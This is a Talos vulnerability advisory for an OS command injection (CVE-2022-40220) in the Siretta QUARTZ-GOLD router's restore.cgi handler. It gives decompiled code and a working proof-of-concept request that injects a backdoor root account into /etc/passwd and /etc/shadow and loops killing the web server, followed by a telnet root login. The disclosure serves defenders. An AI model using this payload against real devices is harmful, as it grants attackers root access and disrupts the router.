# Talos Vulnerability Report

### TALOS-2022-1612

## Siretta QUARTZ-GOLD httpd txt/restore.cgi OS command injection vulnerability

##### January 26, 2023

##### CVE Number

CVE-2022-40220

##### SUMMARY

An OS command injection vulnerability exists in the httpd txt/restore.cgi functionality of Siretta QUARTZ-GOLD G5.0.1.5-210720-141020. A specially-crafted network request can lead to arbitrary command execution. An attacker can send an HTTP request to trigger this vulnerability.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable by Talos or confirmed to be vulnerable by the vendor.

Siretta QUARTZ-GOLD G5.0.1.5-210720-141020

##### PRODUCT URLS

QUARTZ-GOLD - <https://www.siretta.com/products/industrial-routers/4g-lte-router/gigabit-ethernet-small-footprint-lte-router-eu/>

##### CVSSv3 SCORE

7.2 - CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

##### CWE

CWE-78 - Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)

##### DETAILS

The Siretta QUARTZ-GOLD is an industrial cellular router with several features and services, such as: SSH, UPNP, VPN, SNMP, LTE, WAN failover, and many others.

The QUARTZ-GOLD router has a web server with several functionalities. One functionality sets several nvram variables and then reboots the router.

This functionality is allowed through the `txt/restore.cgi` API. Following one of the functions involved in executing this API:

```
void wi_restore_custom(char* url,size_t len)

{
 [...]

  read_len = len;
  [...]
  tmp_dir_path[0] = '\0';
  data_pointer = (void *)skip_header(&read_len);
  if (data_pointer != (void *)0x0) {
    [...]
    data_pointer = malloc(read_len);
    [...]
    is_same = web_read(data_pointer,read_len);
    read_len = read_len - is_same;
    strcpy(tmp_dir_path,"/tmp/nvram_restoreXXXXXX");
    mktemp(tmp_dir_path);
    iVar1 = f_write(tmp_dir_path,data_pointer,is_same,0,0x180);                                                 [1]
    [...]
    tmp_dir_fd = fopen(tmp_dir_path,"r");
    if (tmp_dir_fd != (FILE *)0x0) {
      while (buffer = fgets(web_data,0x200,tmp_dir_fd), buffer != (char *)0x0) {
        buffer = strdup(web_data);
        if (buffer == (char *)0x0) goto LAB_00016940;
        is_same = _vstrsep(buffer,"=",&nvram_key,&nvram_value,0);                                               [2]
        if ((((1 < is_same) && (is_same = strcmp(nvram_key,"routersn"), is_same != 0)) &&
            (is_same = strcmp(nvram_key,"et0macaddr"), is_same != 0)) &&
           (((is_same = strcmp(nvram_key,"lan_hwaddr"), is_same != 0 &&
             (is_same = strcmp(nvram_key,"wan_hwaddr"), is_same != 0)) &&
            (is_same = strcmp(nvram_key,"wl0_hwaddr"), is_same != 0)))) {
          sprintf(system_command,"nvram set %s=%s",nvram_key,nvram_value);                                      [3]
          system(system_command);                                                                               [4]
          memset(web_data,0,0x200);
         [...]
        }
        [...]
}

```

`wi_restore_custom` will, at `[1]`, write the request’s body into a temporary file. The request’s body should contain a series of lines of the `<nvaram_key>=<nvram_value>` format. Indeed, at `[2]`, a line of the request’s body is parsed and split in two parts: the nvram key and the nvram value. At `[3]` the `nvram set <parsed_nvram_key>=<parsed_nvram_value>` string is composed; then it is executed at `[4]` using the `system` function.

No command injection related checks are performed on the, supposedly, `nvram_key` and the `nvram_value`. This means that any value will reach the `system` function without command injection related checks. Because of this the `wi_restore_custom` function is vulnerable to an OS command injection. This vulnerability can lead to arbitrary command execution.

### Exploit Proof of Concept

Sending a request like the following:

```
POST /txt/restore.cgi?_http_id=<a valid TID> HTTP/1.1
Authorization: Basic <a valid basic auth>
Content-Length: 428
Content-Type: multipart/form-data; boundary=c6ced257295a2b54067e956663d1fbda

--c6ced257295a2b54067e956663d1fbda
Content-Disposition: form-data; name="content"; filename="content"

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA `echo "">>/etc/passwd; echo "poc:x:0:0:root:/root:/bin/sh" >> /etc/passwd; echo "" >> /etc/shadow; echo 'poc:$1$HSeR2q0g$KOjqL5H5DKyLpf0H1apr51:0:0:99999:7:0:0:'>> /etc/shadow; while [ 1 ]; do killall httpd; done`=POC
--c6ced257295a2b54067e956663d1fbda--

```

If the request was successful, it is now possible to access the device using `poc:admin` as credentials.
For instance connecting, using telnet, to port 2323 we can provide the injected credentials:

```
telnet 192.168.0.1 2323
Trying 192.168.0.1...
Connected to 192.168.0.1.
Escape character is '^]'.
QUARTZ-GOLD login: poc
Password:

root@QUARTZ-GOLD:/tmp/home/root#

```
